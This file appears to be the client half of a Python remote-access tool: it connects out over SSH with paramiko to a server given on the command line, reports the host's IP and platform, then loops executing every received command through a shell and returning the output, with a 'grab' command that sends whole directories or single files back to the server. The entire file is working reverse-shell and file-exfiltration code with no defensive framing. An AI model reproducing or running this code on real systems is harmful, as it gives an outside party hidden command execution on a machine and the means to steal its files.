import argparse
import os
import socket
import subprocess
import sys

import paramiko


def send_files(chan, local_path, fname=None, verbose=False):
    try:
        # check path
        try:
            directory = [fname] if fname else os.listdir(local_path)
        except Exception:
            return 'invalid path'
        # check file in dir
        if fname and not os.path.isfile(os.path.join(local_path, fname)):
            return 'no such file'
        chan.sendall('ok')
        count = 0
        for filename in directory:
            # skip if folder
            if not os.path.isfile(os.path.join(local_path, filename)):
                continue
            count += 1
            size = bin(len(filename))[2:].zfill(16)   # encode filename size as 16 bit binary
            chan.send(size.encode())
            chan.send(filename.encode())

            filename = os.path.join(local_path, filename)
            filesize = os.path.getsize(filename)
            filesize = bin(filesize)[2:].zfill(32)   # encode filesize as 32 bit binary
            chan.send(filesize.encode())

            with open(filename, 'rb') as file_to_send:
                fstream = file_to_send.read()
                chan.sendall(fstream)
            if verbose:
                print(f'[{count}]: File({filename}) sent')
        return f'[+] Done ({count})'
    except Exception as e:
        return e.__class__.__name__


def get_ip(get_hostname=False):
    ip = socket.gethostbyname(socket.gethostname())
    if get_hostname:
        return ip, socket.gethostname()
    else:
        return ip


def get_args():
    parser = argparse.ArgumentParser(description='Client')
    parser.add_argument('sip', help='the server ip')
    parser.add_argument('sp', type=int, help='the server port')
    parser.add_argument('un', help='the username of the ssh connection')
    parser.add_argument('ps', help='the password of the ssh connection')
    parser.add_argument('-v', '--verbose', action='store_true')
    return parser.parse_args()


def main():
    args = get_args()
    server_ip, server_port = args.sip, args.sp
    username, password = args.un, args.ps
    verb = args.verbose

    # create ssh client and try to connect
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(server_ip, server_port, username=username, password=password)
    except paramiko.ssh_exception.AuthenticationException as e:
        print(e)
        sys.exit(1)
    chan = client.get_transport().open_session()

    # check connection communication
    chan.sendall(f'{get_ip()} {sys.platform}')
    # print(get_ip())
    # chan.sendall(sys.platform)
    serv_req = chan.recv(16)
    if verb:
        print(serv_req)

    # command cycle
    while True:
        command = chan.recv(1024)
        try:
            command = command.decode('utf-8')
            if 'grab' in command:
                # parse args from grab command
                grab_args = command.split()
                if len(grab_args) == 2:
                    dir_path = grab_args[1]
                    cmd_result = send_files(chan, dir_path, verbose=verb)
                elif len(grab_args) == 3:
                    dir_path, fname = grab_args[1:]
                    cmd_result = send_files(chan, dir_path, fname, verb)
                else:
                    cmd_result = 'invalid grab command (dir_path [file_name])'
            elif command == 'server stop':
                client.close()
                sys.exit(0)
            else:
                cmd_result = subprocess.check_output(command, shell=True)
                if not cmd_result:
                    cmd_result = 'done(no result)'
            if chan.send_ready():
                chan.send(cmd_result)
        except Exception as e:
            chan.send(str(e))


if __name__ == "__main__":
    main()
